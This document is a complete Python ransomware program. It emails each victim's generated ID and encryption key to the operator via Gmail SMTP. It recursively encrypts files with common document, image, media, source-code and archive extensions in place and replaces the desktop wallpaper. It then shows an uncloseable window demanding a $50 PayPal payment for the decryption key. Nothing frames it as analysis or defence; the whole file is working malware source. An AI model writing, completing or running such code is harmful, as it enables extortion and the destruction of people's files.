import pymsgbox
from cryptography.fernet import Fernet
import ctypes
import os
import smtplib
from email.message import EmailMessage
import tkinter as tk
from tkinter import messagebox as tkMessageBox
import ctypes


def write_key():
    key = Fernet.generate_key()
    key2 = Fernet.generate_key()
    return key + key2


def encrypt(filename, key):
    """
    Given a filename (str) and key (bytes), it encrypts the file and write it
#     """
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(filename, "wb") as file2:
            file2.write(encrypted_data)


def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    decrypted_data = f.decrypt(encrypted_data)
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)


def change_background(image_path):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER, 0, image_path, 0)


def discoverFiles(startpath):
    extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # images
        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies

        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',  # OpenOffice, Adobe, Latex, Markdown, etc
        'yml', 'yaml', 'json', 'xml', 'csv',  # structured data
        'db', 'sql', 'dbf', 'mdb', 'iso',  # databases and disc images

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web technologies
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
        'java', 'class', 'jar',  # java source code
        'ps', 'bat', 'vb',  # windows based scripts
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
        'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path


def download_image(url="your image for encryption"):
    import urllib.request
    import os
    path = r"c:\bac"
    try:
        os.mkdir(path)
    except FileExistsError:
        pass
    urllib.request.urlretrieve(url, path + r"\bg.png")
    return path + r"\bg.png"


def sendmail(email="youremail@gamil.com", password="yourpass", message="", startpath=""):

    msg = EmailMessage()
    msg["subject"] = "FILE ENCRYPTION VIRUS"
    msg["From"] = email
    msg["To"] = email
    msg.set_content(message)
    with open(startpath + r"\data.txt", "w") as f:
        f.write(message)
    msg.add_attachment(open(startpath + r"\data.txt", "r").read(), filename="data.txt")
    with smtplib.SMTP(host="smtp.gmail.com", port=587) as server:
        server.starttls()
        server.login(email, password)
        server.send_message(msg)


def main():
    unique_user_id = Fernet.generate_key()
    key = Fernet.generate_key() + Fernet.generate_key() + Fernet.generate_key() + Fernet.generate_key() + Fernet.generate_key() + Fernet.generate_key()
    startpath = r"c:\newtest"
    sendmail(message=f"THE USER'S ID IS:\n{unique_user_id.decode()}\n\nTHE USER'S KEY IS:\n{key.decode()}", startpath=startpath)
    for filename in discoverFiles(startpath):
        encrypt(filename, key)
    download_image()
    change_background(download_image())
    GUI(key, unique_user_id, startpath)


def GUI(key, id, startpath):
    import tkinter as tk

    root = tk.Tk()
    root.geometry("750x296")
    root.overrideredirect(True)

    def close_program():
        root.destroy()

    def disable_event():
        pass

    def retrieve_input(key, id):
        inputValue = textBox.get("1.0", "end-1c")
        if inputValue == key.decode():
            pymsgbox.alert(
                'Correct, you data has been decrypted!\nthe program will close after decryption is done\npress ok to start the decryption process',
                'Decrypted!')
            for filename in discoverFiles(startpath):
                decrypt(filename, key)
            download_image("https://wallpapercave.com/wp/wp4690604.jpg")
            change_background(download_image("https://wallpapercave.com/wp/wp4690604.jpg"))
            close_program()
        else:
            pymsgbox.alert('Incorrect, stop guessing and pay already!', 'Still encrypted...!')

    w = tk.Label(root,
                 text=f"As you may notice your files are encrypted YAY!\nIf you reboot the computer, your files will stay encrypted forever.\nSend 50$ to the paypal account itaydumay@gmail.com with your unique IDand you will receive the decryption key\nYour unique ID is:\n{id.decode()}\n",
                 font=("Helvetica", 16))
    w.pack()
    textBox = tk.Text(root, height=1, width=50)
    textBox.pack()
    buttonCommit = tk.Button(root, height=1, width=10, text="Decrypt",
                             command=lambda: retrieve_input(key, id))
    # command=lambda: retrieve_input() >>> just means do this when i press the button

    buttonCommit.pack()
    root.protocol("WM_DELETE_WINDOW", disable_event)
    root.mainloop()


if __name__ == "__main__":
    main()

